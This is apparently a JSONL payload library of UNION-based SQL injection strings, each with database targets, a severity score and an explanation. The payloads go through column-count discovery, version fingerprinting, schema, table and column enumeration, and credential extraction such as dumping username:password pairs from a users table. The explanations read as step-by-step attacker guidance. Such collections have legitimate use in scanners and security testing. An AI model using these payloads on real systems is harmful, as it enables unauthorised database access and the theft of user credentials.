{"text": "' UNION SELECT NULL,NULL,NULL --", "technique": "union", "databases": ["any"], "contexts": ["string"], "waf_bypasses": ["none"], "severity_boost": 0.90, "explanation": "Three-column UNION enumeration. A successful response at this point means the original query has exactly three columns."}
{"text": "' UNION SELECT NULL,NULL,NULL,NULL --", "technique": "union", "databases": ["any"], "contexts": ["string"], "waf_bypasses": ["none"], "severity_boost": 0.90, "explanation": "Four-column UNION enumeration. Systematic NULL addition is the standard approach to discovering column counts."}
{"text": "' UNION SELECT NULL,NULL,NULL,NULL,NULL --", "technique": "union", "databases": ["any"], "contexts": ["string"], "waf_bypasses": ["none"], "severity_boost": 0.90, "explanation": "Five-column UNION enumeration. Higher column counts are common in SELECT * queries against wide tables."}
{"text": "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL --", "technique": "union", "databases": ["any"], "contexts": ["string"], "waf_bypasses": ["none"], "severity_boost": 0.89, "explanation": "Six-column UNION enumeration. Continues the systematic process of matching the column count of the original query."}
{"text": "' ORDER BY 1 --", "technique": "union", "databases": ["any"], "contexts": ["string"], "waf_bypasses": ["none"], "severity_boost": 0.92, "explanation": "Alternative column count detection via ORDER BY. Increment the number until an error occurs; the last successful number equals the column count."}
{"text": "' ORDER BY 5 --", "technique": "union", "databases": ["any"], "contexts": ["string"], "waf_bypasses": ["none"], "severity_boost": 0.92, "explanation": "ORDER BY with higher column index. If this succeeds, the query has at least 5 columns. Use binary search for efficiency."}
{"text": "' ORDER BY 10 --", "technique": "union", "databases": ["any"], "contexts": ["string"], "waf_bypasses": ["none"], "severity_boost": 0.92, "explanation": "ORDER BY 10 for wide queries. Binary search between last success and this value quickly narrows down column count."}
{"text": "' UNION SELECT 'a',NULL,NULL --", "technique": "union", "databases": ["any"], "contexts": ["string"], "waf_bypasses": ["none"], "severity_boost": 0.88, "explanation": "String-type detection. Replace NULLs with string values one at a time to find which columns are rendered in the response and accept string data."}
{"text": "' UNION SELECT NULL,'a',NULL --", "technique": "union", "databases": ["any"], "contexts": ["string"], "waf_bypasses": ["none"], "severity_boost": 0.88, "explanation": "Tests the second column for string data type. Identifying string-type columns is necessary for extracting text data through the UNION."}
{"text": "' UNION SELECT @@version,NULL,NULL --", "technique": "union", "databases": ["mysql", "mssql"], "contexts": ["string"], "waf_bypasses": ["none"], "severity_boost": 0.92, "explanation": "Extracts database version via @@version global variable. Works on MySQL and MSSQL. The version string reveals exact DB type and patch level."}
{"text": "' UNION SELECT version(),NULL,NULL --", "technique": "union", "databases": ["mysql", "postgresql"], "contexts": ["string"], "waf_bypasses": ["none"], "severity_boost": 0.92, "explanation": "PostgreSQL and MySQL version function. Returns the full version string including build details useful for identifying exploitable vulnerabilities."}
{"text": "' UNION SELECT sqlite_version(),NULL,NULL --", "technique": "union", "databases": ["sqlite"], "contexts": ["string"], "waf_bypasses": ["none"], "severity_boost": 0.90, "explanation": "SQLite version detection. sqlite_version() returns the library version, useful for determining available features and known vulnerabilities."}
{"text": "' UNION SELECT banner,NULL FROM v$version --", "technique": "union", "databases": ["oracle"], "contexts": ["string"], "waf_bypasses": ["none"], "severity_boost": 0.88, "explanation": "Oracle version extraction from v$version system view. Returns the full banner including Oracle edition and patch set information."}
{"text": "' UNION SELECT table_name,NULL FROM information_schema.tables --", "technique": "union", "databases": ["mysql", "postgresql", "mssql"], "contexts": ["string"], "waf_bypasses": ["none"], "severity_boost": 0.93, "explanation": "Enumerates all table names from the information_schema. This is the primary reconnaissance step for discovering the database structure."}
{"text": "' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database() --", "technique": "union", "databases": ["mysql"], "contexts": ["string"], "waf_bypasses": ["none"], "severity_boost": 0.93, "explanation": "MySQL-specific: limits table enumeration to the current database using database() function, filtering out system tables."}
{"text": "' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public' --", "technique": "union", "databases": ["postgresql"], "contexts": ["string"], "waf_bypasses": ["none"], "severity_boost": 0.92, "explanation": "PostgreSQL: enumerates tables in the public schema which is the default schema for user-created tables."}
{"text": "' UNION SELECT name,NULL FROM sqlite_master WHERE type='table' --", "technique": "union", "databases": ["sqlite"], "contexts": ["string"], "waf_bypasses": ["none"], "severity_boost": 0.93, "explanation": "SQLite table enumeration from sqlite_master system table. Returns all user-created table names in the database file."}
{"text": "' UNION SELECT name,sql FROM sqlite_master WHERE type='table' --", "technique": "union", "databases": ["sqlite"], "contexts": ["string"], "waf_bypasses": ["none"], "severity_boost": 0.95, "explanation": "SQLite full schema extraction. The sql column contains the CREATE TABLE statement, revealing all column names and types at once."}
{"text": "' UNION SELECT table_name,NULL FROM all_tables --", "technique": "union", "databases": ["oracle"], "contexts": ["string"], "waf_bypasses": ["none"], "severity_boost": 0.90, "explanation": "Oracle table enumeration from the all_tables data dictionary view. Returns tables accessible to the current user."}
{"text": "' UNION SELECT name,NULL FROM sys.tables --", "technique": "union", "databases": ["mssql"], "contexts": ["string"], "waf_bypasses": ["none"], "severity_boost": 0.91, "explanation": "MSSQL table enumeration from sys.tables catalog view. Lists all user tables in the current database."}
{"text": "' UNION SELECT column_name,data_type FROM information_schema.columns WHERE table_name='users' --", "technique": "union", "databases": ["mysql", "postgresql", "mssql"], "contexts": ["string"], "waf_bypasses": ["none"], "severity_boost": 0.93, "explanation": "Column enumeration for a specific table. Extracts column names and data types to understand the table structure before data exfiltration."}
{"text": "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users' --", "technique": "union", "databases": ["mysql", "postgresql", "mssql"], "contexts": ["string"], "waf_bypasses": ["none"], "severity_boost": 0.93, "explanation": "Simplified column enumeration returning just column names for the users table. Essential step before extracting credentials."}
{"text": "' UNION SELECT username,password FROM users --", "technique": "union", "databases": ["any"], "contexts": ["string"], "waf_bypasses": ["none"], "severity_boost": 0.95, "explanation": "Direct credential extraction from a users table. Assumes column names have been enumerated in a prior step. Extracts usernames and password hashes."}
{"text": "' UNION SELECT GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=database() --", "technique": "union", "databases": ["mysql"], "contexts": ["string"], "waf_bypasses": ["none"], "severity_boost": 0.93, "explanation": "MySQL GROUP_CONCAT aggregates all table names into a single comma-separated string, extracting all tables in one query through a single output column."}
{"text": "' UNION SELECT string_agg(table_name,','),NULL FROM information_schema.tables --", "technique": "union", "databases": ["postgresql"], "contexts": ["string"], "waf_bypasses": ["none"], "severity_boost": 0.91, "explanation": "PostgreSQL equivalent of GROUP_CONCAT using string_agg(). Concatenates all table names into one string for single-query extraction."}
{"text": "' UNION SELECT GROUP_CONCAT(column_name),NULL FROM information_schema.columns WHERE table_name='users' --", "technique": "union", "databases": ["mysql"], "contexts": ["string"], "waf_bypasses": ["none"], "severity_boost": 0.93, "explanation": "Extracts all column names from the users table in a single concatenated string. Efficient one-shot schema reconnaissance."}
{"text": "' UNION SELECT GROUP_CONCAT(username,':',password),NULL FROM users --", "technique": "union", "databases": ["mysql"], "contexts": ["string"], "waf_bypasses": ["none"], "severity_boost": 0.95, "explanation": "Extracts all credentials in username:password format in a single query. GROUP_CONCAT combines all rows into one output string."}
{"text": "' UNION SELECT concat(username,':',password),NULL FROM users --", "technique": "union", "databases": ["mysql", "postgresql"], "contexts": ["string"], "waf_bypasses": ["none"], "severity_boost": 0.93, "explanation": "Per-row credential concatenation using concat(). Returns one row per user with formatted username:password pairs."}
{"text": "' UNION SELECT username||':'||password,NULL FROM users --", "technique": "union", "databases": ["oracle", "postgresql", "sqlite"], "contexts": ["string"], "waf_bypasses": ["none"], "severity_boost": 0.93, "explanation": "Concatenation using || operator for databases that support it. Formats credentials as username:password for each row."}
{"text": "' UNION SELECT user(),database() --", "technique": "union", "databases": ["mysql"], "contexts": ["string"], "waf_bypasses": ["none"], "severity_boost": 0.90, "explanation": "MySQL metadata extraction: user() returns the current database user, database() returns the current database name. Essential reconnaissance."}
{"text": "' UNION SELECT current_user,current_database() --", "technique": "union", "databases": ["postgresql"], "contexts": ["string"], "waf_bypasses": ["none"], "severity_boost": 0.90, "explanation": "PostgreSQL metadata extraction: current_user and current_database() reveal the privilege level and target database."}
{"text": "' UNION SELECT user,NULL FROM dual --", "technique": "union", "databases": ["oracle"], "contexts": ["string"], "waf_bypasses": ["none"], "severity_boost": 0.88, "explanation": "Oracle current user extraction. Oracle requires FROM dual for simple SELECT queries. The user keyword returns the current schema user."}
{"text": "' UNION SELECT SYSTEM_USER,NULL --", "technique": "union", "databases": ["mssql"], "contexts": ["string"], "waf_bypasses": ["none"], "severity_boost": 0.88, "explanation": "MSSQL system user extraction. SYSTEM_USER returns the SQL Server login name, revealing the privilege level of the connection."}
{"text": "' UNION SELECT DB_NAME(),NULL --", "technique": "union", "databases": ["mssql"], "contexts": ["string"], "waf_bypasses": ["none"], "severity_boost": 0.88, "explanation": "MSSQL current database name extraction. DB_NAME() returns the database context, useful for targeting further queries."}
{"text": "' UNION SELECT schema_name,NULL FROM information_schema.schemata --", "technique": "union", "databases": ["mysql", "postgresql", "mssql"], "contexts": ["string"], "waf_bypasses": ["none"], "severity_boost": 0.88, "explanation": "Enumerates all database schemas/databases on the server. Reveals other databases that may contain sensitive data."}
{"text": "' UNION ALL SELECT NULL,NULL,NULL --", "technique": "union", "databases": ["any"], "contexts": ["string"], "waf_bypasses": ["none"], "severity_boost": 0.89, "explanation": "UNION ALL variant that includes duplicate rows and avoids DISTINCT overhead. Sometimes needed when UNION alone is blocked."}
{"text": "' UNION SELECT NULL,NULL,NULL FROM dual --", "technique": "union", "databases": ["oracle"], "contexts": ["string"], "waf_bypasses": ["none"], "severity_boost": 0.88, "explanation": "Oracle-specific UNION with FROM dual. Oracle requires a FROM clause in every SELECT, so dual is needed for NULL enumeration."}
